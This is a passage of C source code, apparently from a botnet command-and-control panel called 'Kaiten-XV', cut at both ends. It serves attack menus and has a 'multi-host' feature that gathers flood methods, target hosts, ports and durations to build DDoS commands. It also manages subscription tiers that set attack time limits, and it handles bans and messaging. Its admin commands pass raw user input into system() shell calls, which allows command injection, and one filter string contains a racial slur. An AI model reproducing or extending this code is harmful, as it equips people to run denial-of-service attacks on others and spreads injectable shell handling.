        while (*src) {
            if (strncmp(src, "[ESC]", 5) == 0) { // Check for the placeholder
                *dst++ = '\033'; // Insert the escape character
                src += 5; // Skip past the placeholder
            } else {
                *dst++ = *src++; // Copy the rest of the line
            }
        }
        *dst = '\0'; // Null-terminate the processed line

        // Send the processed line of the file.
        if(send(datafd, processed_line, strlen(processed_line), MSG_NOSIGNAL) == -1) {
            fclose(file); // Make sure to close the file if we're exiting due to an error.
            goto end;
        }
    }

    fclose(file); // Close the file after reading all lines.
}

if(strcasestr(buf, "bypass"))
{
    send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);

    FILE *file = fopen("/root/banners/attacks_bypass.txt", "r"); // Open the file for reading.
    if(file == NULL) {
        perror("Failed to open file");
        goto end; // Handle the error if the file can't be opened.
    }

    char line[1024]; // Adjust the size according to the maximum line length expected.
    char processed_line[2048]; // Make sure this is large enough to hold the processed line.
    while(fgets(line, sizeof(line), file) != NULL) {
        char *src = line;
        char *dst = processed_line;
        // Replace [ESC] with the actual escape character
        while (*src) {
            if (strncmp(src, "[ESC]", 5) == 0) { // Check for the placeholder
                *dst++ = '\033'; // Insert the escape character
                src += 5; // Skip past the placeholder
            } else {
                *dst++ = *src++; // Copy the rest of the line
            }
        }
        *dst = '\0'; // Null-terminate the processed line

        // Send the processed line of the file.
        if(send(datafd, processed_line, strlen(processed_line), MSG_NOSIGNAL) == -1) {
            fclose(file); // Make sure to close the file if we're exiting due to an error.
            goto end;
        }
    }

    fclose(file); // Close the file after reading all lines.
}

if(strcasestr(buf, "special"))
{
    send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);

    FILE *file = fopen("/root/banners/attacks_special.txt", "r"); // Open the file for reading.
    if(file == NULL) {
        perror("Failed to open file");
        goto end; // Handle the error if the file can't be opened.
    }

    char line[1024]; // Adjust the size according to the maximum line length expected.
    char processed_line[2048]; // Make sure this is large enough to hold the processed line.
    while(fgets(line, sizeof(line), file) != NULL) {
        char *src = line;
        char *dst = processed_line;
        // Replace [ESC] with the actual escape character
        while (*src) {
            if (strncmp(src, "[ESC]", 5) == 0) { // Check for the placeholder
                *dst++ = '\033'; // Insert the escape character
                src += 5; // Skip past the placeholder
            } else {
                *dst++ = *src++; // Copy the rest of the line
            }
        }
        *dst = '\0'; // Null-terminate the processed line

        // Send the processed line of the file.
        if(send(datafd, processed_line, strlen(processed_line), MSG_NOSIGNAL) == -1) {
            fclose(file); // Make sure to close the file if we're exiting due to an error.
            goto end;
        }
    }

    fclose(file); // Close the file after reading all lines.
}

if(strcasestr(buf, "game"))
{
    send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);

    FILE *file = fopen("/root/banners/attacks_game.txt", "r"); // Open the file for reading.
    if(file == NULL) {
        perror("Failed to open file");
        goto end; // Handle the error if the file can't be opened.
    }

    char line[1024]; // Adjust the size according to the maximum line length expected.
    char processed_line[2048]; // Make sure this is large enough to hold the processed line.
    while(fgets(line, sizeof(line), file) != NULL) {
        char *src = line;
        char *dst = processed_line;
        // Replace [ESC] with the actual escape character
        while (*src) {
            if (strncmp(src, "[ESC]", 5) == 0) { // Check for the placeholder
                *dst++ = '\033'; // Insert the escape character
                src += 5; // Skip past the placeholder
            } else {
                *dst++ = *src++; // Copy the rest of the line
            }
        }
        *dst = '\0'; // Null-terminate the processed line

        // Send the processed line of the file.
        if(send(datafd, processed_line, strlen(processed_line), MSG_NOSIGNAL) == -1) {
            fclose(file); // Make sure to close the file if we're exiting due to an error.
            goto end;
        }
    }

    fclose(file); // Close the file after reading all lines.
}

if(strcasestr(buf, "admin"))
{
    if(!strcasecmp(accounts[find_line].admin, "admin"))
    {
        // Clear the screen
        send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);			

        // Open the banner file for the admin
        FILE *file = fopen("/root/banners/admin.txt", "r"); // Replace with your admin banner path
        if(file == NULL) {
            perror("Failed to open file");
            goto end; // Handle the error if the file can't be opened.
        }

        char line[1024]; // Adjust the size according to the maximum line length expected.
        char processed_line[2048]; // Make sure this is large enough to hold the processed line.
        while(fgets(line, sizeof(line), file) != NULL) {
            char *src = line;
            char *dst = processed_line;
            // Replace [ESC] with the actual escape character
            while (*src) {
                if (strncmp(src, "[ESC]", 5) == 0) { // Check for the placeholder
                    *dst++ = '\033'; // Insert the escape character
                    src += 5; // Skip past the placeholder
                } else {
                    *dst++ = *src++; // Copy the rest of the line
                }
            }
            *dst = '\0'; // Null-terminate the processed line

            // Send the processed line of the file.
            if(send(datafd, processed_line, strlen(processed_line), MSG_NOSIGNAL) == -1) {
                fclose(file); // Make sure to close the file if we're exiting due to an error.
                goto end;
            }
        }

        fclose(file); // Close the file after reading all lines.
        
        // Start the title thread if needed
        pthread_create(&title, NULL, &TitleWriter, sock);
    }
}

		if(strcasestr(buf, "multi-host"))
        {
            char cmd[50];
            char method[50];
            char port[50];
            char time[50];
            sprintf(botnet, "\e[37mMethod? (\e[36mudp, udpraw, xtdv2\e[37m)\r\n\e[37mMethod:");
            if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            if(fdgets(method, sizeof method, datafd) < 1);
            trim(method);
            sprintf(botnet, "\e[37mHow Many Hosts Are We Sending Floods To? (2-5)\e[37m\r\nAmount:\e[37m ");
            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            if(fdgets(buf, sizeof buf, datafd) < 1);
            trim(buf);
            int floods = atoi(buf);
            if(floods < 6)
                {
                    int g;
                    int k;
                    char host_list[floods][20];
                        for(g = 1; g <=floods; g++)
                            {
                                sprintf(botnet, "\e[37mEnter host [>]\e[36m%d\e[37m: ", g);
                                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                                if(fdgets(host_list[g], sizeof host_list[g], datafd) < 1);
                                trim(host_list[g]);      
                            }
                            sprintf(botnet, "\e[37mPort: ");
                            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                            if(fdgets(port, sizeof port, datafd) < 1);
                            trim(port);
                            sprintf(botnet, "\e[37mTime: ");
                            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                            if(fdgets(time, sizeof time, datafd) < 1);
                            trim(time);

                for(k = 1; k <=floods; k++)
            {
                sprintf(botnet, "\e[37mSent \e[31mflood to host: \e[36m[>]%d\r\n", k);
                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                sprintf(cmd, "%s %s %s %s\n", method, host_list[k], port, time);
                //broadcast(cmd, "ddos");
            }
    }
    else
    {
            sprintf(botnet, "            You Can Send A \e[1;31mMAX\e[37m Of 5 Floods And A Minimum Of 2 Floods\r\n                   When Using The \e[1;36m'\e[37mMULTI\e[1;36m-\e[37mHOST\e[1;36m' \e[37mFunction\r\n");
            if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
    }
}
///////////////////////////////////////////////////////////////////////////////////////////////START OF EXTRA COMMANDS////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////START OF EXTRA COMMANDS////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////START OF EXTRA COMMANDS////////////////////////////////////////////////////////////////////////////

else if(strcasestr(buf, "msg") || strcasestr(buf, "message"))
	{	
		int tosend;
		char sentmsg[800];
		char msg[800];
		char usertomsg[800];
		sprintf(usethis, "User:");
		if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
		memset(buf, 0, sizeof(buf));
		if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
		trim(buf);
		strcpy(usertomsg, buf);

		sprintf(usethis, "MSG:");	
		if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
		memset(buf, 0, sizeof(buf));
		if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
		trim(buf);
		strcpy(msg, buf);
		if(strcasestr(msg, "nigger") || strcasestr(msg, "nig") || strcasestr(msg, "n1g") || strcasestr(msg, "nlg") || strcasestr(msg, "n.i.g") || strcasestr(msg, "n!g") || strcasestr(msg, "n|g"))
		{
			sprintf(usethis, "\e[1;31mPlease Do Not Use The 'N' Word\r\n");
			if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
			sleep(2);
		} else {

		for(tosend=0;tosend < MAXFDS;tosend++){
			if(strstr(managements[tosend].id, usertomsg))
			{
				if(managements[tosend].msgtoggle == 0)
				{
					char sendmsg[800];
					sprintf(sendmsg, "\r\n\e[1;37m──────────────────────────────────────────────────\r\nMSG From %s | %s\r\n\e[1;37m──────────────────────────────────────────────────\r\n", managements[datafd].id, msg);
					if(send(tosend, sendmsg, strlen(sendmsg), MSG_NOSIGNAL) == -1) goto end;
					sprintf(sendmsg, "\e[38;2;245;245;20m╔══╣\e[38;2;125;125;255m%s@Kaiten-XV\e[38;2;245;245;20m║\r\n╚═»\e[1;37m", managements[tosend].id);
					if(send(tosend, sendmsg, strlen(sendmsg), MSG_NOSIGNAL) == -1) goto end;
					sent = 1;
				} else {
					sent = 3;
				}
			}
		}		
			if(sent == 1)
			{
				sprintf(sentmsg, "\r\n\e[1;37m──────────────────────────────────────────────────\r\nMsg Sent to: %s\r\n\e[1;37m──────────────────────────────────────────────────\r\n", usertomsg);
				if(send(datafd, sentmsg, strlen(sentmsg), MSG_NOSIGNAL) == -1) goto end;

				sent = 0;
			}
			else if(sent == 3)
			{
				sprintf(usethis, "\r\n\e[1;37m──────────────────────────────────────────────────\r\n\e[1;37mUser %s Has Recieving Of Messages Toggled \e[1;31mOFF\r\n\e[1;37m──────────────────────────────────────────────────\r\n", usertomsg);
				if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
			}

			else if(!sent)  
			{
				sprintf(usethis, "\r\n\e[1;37m──────────────────────────────────────────────────\r\n\e[1;37mUser %s Is Not Online\r\n\e[1;37m──────────────────────────────────────────────────\r\n", usertomsg);
				if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
				memset(msg,0,sizeof(msg));
			} 
		}
		memset(buf,0,sizeof(buf));
	}

if(strcasestr(buf, "online"))
{
      send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);			
				if(send(datafd, ktn_banner1,  strlen(ktn_banner1),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ktn_banner2,  strlen(ktn_banner2),	MSG_NOSIGNAL) == -1) goto end; 
				if(send(datafd, ktn_banner3,  strlen(ktn_banner3),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ktn_banner4,  strlen(ktn_banner4),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ktn_banner5,  strlen(ktn_banner5),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ktn_banner6,  strlen(ktn_banner6),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ktn_banner7,  strlen(ktn_banner7),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ktn_banner8,  strlen(ktn_banner8),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ktn_banner9,  strlen(ktn_banner9),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ktn_bannera,  strlen(ktn_bannera),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ktn_bannerb,  strlen(ktn_bannerb),	MSG_NOSIGNAL) == -1) goto end;
	if(managements[datafd].adminstatus == 1)
	{
		int online;
		sprintf(usethis, "\e[1;37mUsers Online\r\n");
		if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
		for(online=0;online < MAXFDS; online++)
		{
			if(strlen(managements[online].id) > 1 && managements[online].connected == 1) 
			{
				if(strcmp(managements[online].planname, "admin") == 0)
				{
					sprintf(botnet, "\r\n\e[1;37m─────────────────────────────────\r\n\e[1;37mUser: \e[1;32m%s \e[1;37m| IP: [\e[1;32mAdmin IP\e[1;37m]\r\n\e[1;37m─────────────────────────────────\r\n", managements[online].id);
					if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
				} else {
					sprintf(botnet, "\r\n\e[1;37m─────────────────────────────────\r\n\e[1;37mUser: \e[1;31m%s \e[1;37m| \e[1;37mIP: [\e[1;31m%s\e[1;37m]\r\n\e[1;37m─────────────────────────────────\r\n", managements[online].id, managements[online].my_ip);
					if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
				}
			}
		}
	} else 
	{
		int online;
		for(online=0;online < MAXFDS; online++)
		{
			if(strlen(managements[online].id) > 1 && managements[online].connected == 1) 
			{
				sprintf(botnet, "\r\n\e[1;37m─────────────────────────────────\r\n\e[1;37mUser: \e[1;31m%s \e[1;37m| IP: \e[1;31mHIDDEN \e[1;37m|\r\n\e[1;37m─────────────────────────────────\r\n", managements[online].id);
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
			}
		}
	}
	sprintf(botnet, "\e[1;33mTotal Users Online: [%d]\r\n", OperatorsConnected);
	if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
}

///////////////////////////////////////////////////////////////////////////////////////////////END OF EXTRA COMMANDS////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////END OF EXTRA COMMANDS////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////END OF EXTRA COMMANDS////////////////////////////////////////////////////////////////////////////


///////////////////////////////////////////////////////////////////////////////////////////////START OF ADMIN COMMANDS////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////START OF ADMIN COMMANDS////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////START OF ADMIN COMMANDS////////////////////////////////////////////////////////////////////////////
if(strcasestr(buf, "user")) {
	if(managements[datafd].adminstatus == 1)
	{
		char options[80];
		char cmd1[800];
		char send1[800];
		char whatyucanuse1[2048];
		char whatyucanuse2[2048];
		char whatyucanuse3[2048];
		char whatyucanuse4[2048];
		char whatyucanuse5[2048];
		char whatyucanuse6[2048];
		char whatyucanuse7[2048];
		char whatyucanuse8[2048];
		char whatyucanuse9[2048];
		char whatyucanuse10[2048];
		char whatyucanuse11[2048];
		char whatyucanuse12[2048];
		char whatyucanuse13[2048];
		char whatyucanuse14[2048];
		char whatyucanuse15[2048];
		char whatyucanuse16[2048];
		char whatyucanuse17[2048];
		char whatyucanuse18[2048];

			
			
					sprintf(whatyucanuse1,  "    \e[38;2;255;0;211m╔════\e[38;2;227;27;216m══════\e[38;2;199;53;221m══════\e[38;2;171;80;226m══════\e[38;2;143;106;231m══════\e[38;2;116;133;235m══════\e[38;2;88;159;240m═════════╗\r\n");
					sprintf(whatyucanuse2,  "    \e[38;2;255;0;211m║[1] \e[38;2;227;27;216mAdd Us\e[38;2;199;53;221mer -- \e[38;2;171;80;226mAdds A\e[38;2;143;106;231m User.\e[38;2;116;133;235m......\e[38;2;88;159;240m.........║\r\n");
					sprintf(whatyucanuse3,  "    \e[38;2;255;0;211m╠════\e[38;2;227;27;216m══════\e[38;2;199;53;221m══════\e[38;2;171;80;226m══════\e[38;2;143;106;231m══════\e[38;2;116;133;235m══════\e[38;2;88;159;240m═════════╣\r\n");
					sprintf(whatyucanuse4,  "    \e[38;2;255;0;211m║[2] \e[38;2;227;27;216mRemove\e[38;2;199;53;221m User \e[38;2;171;80;226m-- Rem\e[38;2;143;106;231moves A\e[38;2;116;133;235m User.\e[38;2;88;159;240m.........║\r\n");
					sprintf(whatyucanuse5,  "    \e[38;2;255;0;211m╠════\e[38;2;227;27;216m══════\e[38;2;199;53;221m══════\e[38;2;171;80;226m══════\e[38;2;143;106;231m══════\e[38;2;116;133;235m══════\e[38;2;88;159;240m═════════╣\r\n");
					sprintf(whatyucanuse6,  "    \e[38;2;255;0;211m║[3] \e[38;2;227;27;216mBan Us\e[38;2;199;53;221mer -- \e[38;2;171;80;226mBans A\e[38;2;143;106;231m Users\e[38;2;116;133;235m Accou\e[38;2;88;159;240mnt.......║\r\n");
					sprintf(whatyucanuse7,  "    \e[38;2;255;0;211m╠════\e[38;2;227;27;216m══════\e[38;2;199;53;221m══════\e[38;2;171;80;226m══════\e[38;2;143;106;231m══════\e[38;2;116;133;235m══════\e[38;2;88;159;240m═════════╣\r\n");
					sprintf(whatyucanuse8,  "    \e[38;2;255;0;211m║[4] \e[38;2;227;27;216mUnban \e[38;2;199;53;221mUser -\e[38;2;171;80;226m- Unba\e[38;2;143;106;231mns A U\e[38;2;116;133;235msers A\e[38;2;88;159;240mccount...║ \r\n");
					sprintf(whatyucanuse9,  "    \e[38;2;255;0;211m╠════\e[38;2;227;27;216m══════\e[38;2;199;53;221m══════\e[38;2;171;80;226m══════\e[38;2;143;106;231m══════\e[38;2;116;133;235m══════\e[38;2;88;159;240m═════════╣ \r\n");
					sprintf(whatyucanuse10, "    \e[38;2;255;0;211m║[5] \e[38;2;227;27;216mIPBan \e[38;2;199;53;221m-- Ban\e[38;2;171;80;226ms A Us\e[38;2;143;106;231mers IP\e[38;2;116;133;235m Addre\e[38;2;88;159;240mss.......║ \r\n");                 // adduser = 1
					sprintf(whatyucanuse11, "    \e[38;2;255;0;211m╠════\e[38;2;227;27;216m══════\e[38;2;199;53;221m══════\e[38;2;171;80;226m══════\e[38;2;143;106;231m══════\e[38;2;116;133;235m══════\e[38;2;88;159;240m═════════╣ \r\n");                 // remove user = 2
					sprintf(whatyucanuse12, "    \e[38;2;255;0;211m║[6] \e[38;2;227;27;216mUn-IPB\e[38;2;199;53;221man -- \e[38;2;171;80;226mUnbans\e[38;2;143;106;231m A Use\e[38;2;116;133;235mrs IP \e[38;2;88;159;240mAddress..║ \r\n");                 // Ban user = 3
 					sprintf(whatyucanuse13, "    \e[38;2;255;0;211m╠════\e[38;2;227;27;216m══════\e[38;2;199;53;221m══════\e[38;2;171;80;226m══════\e[38;2;143;106;231m══════\e[38;2;116;133;235m══════\e[38;2;88;159;240m═════════╣ \r\n");                 // UnBan User= 4
					sprintf(whatyucanuse14, "    \e[38;2;255;0;211m║[7] \e[38;2;227;27;216mKick U\e[38;2;199;53;221mser --\e[38;2;171;80;226m Kicks\e[38;2;143;106;231m A Use\e[38;2;116;133;235mr Off \e[38;2;88;159;240mThe Net..║ \r\n");                 // IP-Ban User = 5
					sprintf(whatyucanuse15, "    \e[38;2;255;0;211m╠════\e[38;2;227;27;216m══════\e[38;2;199;53;221m══════\e[38;2;171;80;226m══════\e[38;2;143;106;231m══════\e[38;2;116;133;235m══════\e[38;2;88;159;240m═════════╣ \r\n");                 // UnIpBan User = 6
					sprintf(whatyucanuse16, "    \e[38;2;255;0;211m║[8] \e[38;2;227;27;216mBlackl\e[38;2;199;53;221mist --\e[38;2;171;80;226m Black\e[38;2;143;106;231mlists \e[38;2;116;133;235mAn IP \e[38;2;88;159;240m(Good)...║ \r\n");                 // Kick User = 7
					sprintf(whatyucanuse17, "    \e[38;2;255;0;211m╚════\e[38;2;227;27;216m══════\e[38;2;199;53;221m══════\e[38;2;171;80;226m══════\e[38;2;143;106;231m══════\e[38;2;116;133;235m══════\e[38;2;88;159;240m═════════╝ \r\n");                 // Blacklist = 8
					sprintf(whatyucanuse18, "    \e[1;37m           Choose: \e[1;33m1 - 2 - 3 - 4 - 5 - 6 - 7 - 8 \r\n");


		if(send(datafd, whatyucanuse1, strlen(whatyucanuse1), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, whatyucanuse2, strlen(whatyucanuse2), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, whatyucanuse3, strlen(whatyucanuse3), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, whatyucanuse4, strlen(whatyucanuse4), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, whatyucanuse5, strlen(whatyucanuse5), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, whatyucanuse6, strlen(whatyucanuse6), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, whatyucanuse7, strlen(whatyucanuse7), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, whatyucanuse8, strlen(whatyucanuse8), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, whatyucanuse9, strlen(whatyucanuse9), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, whatyucanuse10, strlen(whatyucanuse10), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, whatyucanuse11, strlen(whatyucanuse11), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, whatyucanuse12, strlen(whatyucanuse12), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, whatyucanuse13, strlen(whatyucanuse13), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, whatyucanuse14, strlen(whatyucanuse14), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, whatyucanuse15, strlen(whatyucanuse15), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, whatyucanuse16, strlen(whatyucanuse16), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, whatyucanuse17, strlen(whatyucanuse17), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, whatyucanuse18, strlen(whatyucanuse18), MSG_NOSIGNAL) == -1) goto end;

		sprintf(options, "\e[38;5;190mOption:");
					if(send(datafd, options, strlen(options), MSG_NOSIGNAL) == -1) goto end;
					memset(buf, 0, sizeof(buf));
					if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
					trim(buf);
			
					if(strstr(buf, "1") || strstr(buf, "ONE") || strstr(buf, "One") || strstr(buf, "one"))
					{
						char username1[80];
						char password1[80];
						char status1[80];
						char maxtime1[80];
						char cooldown1[80];
						char newexpiry[800];
						char send1[1024];
						char new1 [800];
						char new2 [800];
						sprintf(usethis, "\e[1;37m──────────────────────────────\r\nUsename:");
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						memset(buf, 0, sizeof(buf));
						if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
						trim(buf);
						strcpy(username1, buf);
						
						sprintf(usethis, "\e[1;37m──────────────────────────────\r\nPassword:");
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						memset(buf, 0, sizeof(buf));
						if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
						trim(buf);
						strcpy(password1, buf);
						
						sprintf(usethis, "\e[1;37m──────────────────────────────\r\nadmin(y or n):");
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						memset(buf, 0, sizeof(buf));
						if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
						trim(buf);
						
						if(strstr(buf, "y") || strstr(buf, "Y") || strstr(buf, "yes") || strstr(buf, "Yes") || strstr(buf, "YES"))
						{
							strcpy(status1, "admin");
							strcpy(maxtime1, "1600");
							strcpy(cooldown1, "60");
							strcpy(newexpiry, "99/99/99");
							goto thing;
						} 
			
						sprintf(usethis, "   \e[1;35m╔═══════╗ ╔═══════╗ ╔═══════╗ ╔═══════╗ ╔═══════╗\r\n   ║\e[1;36m CUTIE \e[1;35m║ ║\e[1;36m NORMAL\e[1;35m║ ║ \e[1;36m VIP \e[1;35m ║ ║ \e[1;36m PRO \e[1;35m ║ ║\e[1;36m GODLY \e[1;35m║\r\n   \e[1;35m╚═══════╝ ╚═══════╝ ╚═══════╝ ╚═══════╝ ╚═══════╝\r\n");
						sprintf(new1,    "   \e[1;35m╔═══════╗ ╔═══════╗ ╔═══════╗ ╔═══════╗ ╔═══════╗\r\n   ║\e[1;36m 300 S \e[1;35m║ ║\e[1;36m 600 S \e[1;35m║ ║ \e[1;36m1300S\e[1;35m ║ ║ \e[1;36m2100S\e[1;35m ║ ║\e[1;36m 3600S \e[1;35m║\r\n   \e[1;35m╚═══════╝ ╚═══════╝ ╚═══════╝ ╚═══════╝ ╚═══════╝\r\n \e[1;37m [_-_]: C = Cooldown\r\n");
						sprintf(new2,    "   \e[1;35m╔═══════╗ ╔═══════╗ ╔═══════╗ ╔═══════╗ ╔═══════╗\r\n   ║\e[1;36m 100 C \e[1;35m║ ║\e[1;36m 100 C \e[1;35m║ ║ \e[1;36m 80 C\e[1;35m ║ ║ \e[1;36m 60 C\e[1;35m ║ ║\e[1;36m  85 C \e[1;35m║\r\n   \e[1;35m╚═══════╝ ╚═══════╝ ╚═══════╝ ╚═══════╝ ╚═══════╝\r\n \e[1;37m [_-_]: S = Seconds\r\n");
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
			            if(send(datafd, new1, strlen(new1), MSG_NOSIGNAL) == -1) goto end;
			            if(send(datafd, new2, strlen(new2), MSG_NOSIGNAL) == -1) goto end;

						sprintf(usethis, "\e[1;35mPlan:");
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						memset(buf, 0, sizeof(buf));
						if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
						trim(buf);
						if(strstr(buf, "CUTIE") || strstr(buf, "cutie") || strstr(buf, "Cutie"));
						{
							strcpy(maxtime1, "300");
							strcpy(cooldown1, "100");
							strcpy(status1, "Cutie");
						}
			
						if(strstr(buf, "NORMAL") || strstr(buf, "normal") || strstr(buf, "Normal"));
						{
							strcpy(maxtime1, "600");
							strcpy(cooldown1, "100");
							strcpy(status1, "Normal");
						}
			
						if(strstr(buf, "VIP") || strstr(buf, "Vip") || strstr(buf, "vip"))
						{
							strcpy(maxtime1, "1300");
							strcpy(cooldown1, "80");
							strcpy(status1, "Vip");
						}

						if(strstr(buf, "PRO") || strstr(buf, "Pro") || strstr(buf, "pro"))
						{
							strcpy(maxtime1, "2100");
							strcpy(cooldown1, "60");
							strcpy(status1, "Pro");
						}
						
						if(strstr(buf, "GODLY") || strstr(buf, "Godly") || strstr(buf, "godly"))
						{
							strcpy(maxtime1, "3600");
							strcpy(cooldown1, "85");
							strcpy(status1, "GODLY");				
						}			
						sprintf(usethis, "\e[1;37m─────────────────────────────────────────\r\nUsage: DD/MM/YY\r\nExpiry:");
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						memset(buf, 0,sizeof(buf));
						if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
						trim(buf);
						strcpy(newexpiry, buf);
						thing:
						sprintf(cmd1, "%s %s %s %s %s %s", username1, password1, status1, maxtime1, cooldown1, newexpiry);
						sprintf(send1, "echo '%s' >> users/login.txt", cmd1);
						system(send1);
						sprintf(usethis2, "\e[1;37m─────────────────────────────────────────\r\n");
						sprintf(usethis, "\e[1;37mAccount [%s] Added\r\n", username1);
						sprintf(usethis3, "\e[1;37m─────────────────────────────────────────\r\n");
						if(send(datafd, usethis2, strlen(usethis2), MSG_NOSIGNAL) == -1) goto end;
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						if(send(datafd, usethis3, strlen(usethis3), MSG_NOSIGNAL) == -1) goto end;
						printf("[Kaiten]:%s Added User: [%s] Plan: [%s]\n", managements[datafd].id, username1, status1);
			
					}
					else if(strstr(buf, "2") || strstr(buf, "TWO") || strstr(buf, "Two") || strstr(buf, "two"))
					{
						char removeuser[80];
						char sys[800];
						sprintf(usethis, "Usename:");
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						memset(buf, 0, sizeof(buf));
						if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
						trim(buf);
						strcpy(removeuser, buf);
						sprintf(sys,"sed '/\\<%s\\>/d' -i users/login.txt", removeuser);
						system(sys);
						sprintf(usethis2, "\e[1;37m──────────────────────────────────────────────\r\n");
						sprintf(usethis, "\e[1;37mAccount [%s] Has Been Removed\r\n", removeuser);
						sprintf(usethis3, "\e[1;37m──────────────────────────────────────────────\r\n");
						if(send(datafd, usethis2, strlen(usethis2), MSG_NOSIGNAL) == -1) goto end;
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						if(send(datafd, usethis3, strlen(usethis3), MSG_NOSIGNAL) == -1) goto end;
						printf("[Kaiten]:%s Removed User: [%s]\n", managements[datafd].id, removeuser);
					}
					else if(strstr(buf, "3") || strstr(buf, "THREE") || strstr(buf, "Three") || strstr(buf, "three"))
					{
						char banuser[80];
						sprintf(usethis, "Username:");
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						memset(buf, 0, sizeof(buf));
						if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
						trim(buf);
						strcpy(banuser, buf);
						sprintf(send1, "echo '%s' >> logs/BANNEDUSERS.txt", banuser);
						system(send1);
						sprintf(usethis, "\e[1;35m Account \e[1;37m[%s] \e[1;35mHas Been Banned\r\n", banuser);
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						printf("[Kaiten]:%s Banned User: [%s]\n", managements[datafd].id, banuser);
					}
					else if(strstr(buf, "4") || strstr(buf, "FOUR") || strstr(buf, "Four") || strstr(buf, "four"))
					{
						char sys[800];
						char unbanuser[80] ;
						sprintf(usethis, "Username:");
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						memset(buf, 0, sizeof(buf));
						if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
						trim(buf);
						strcpy(unbanuser, buf);
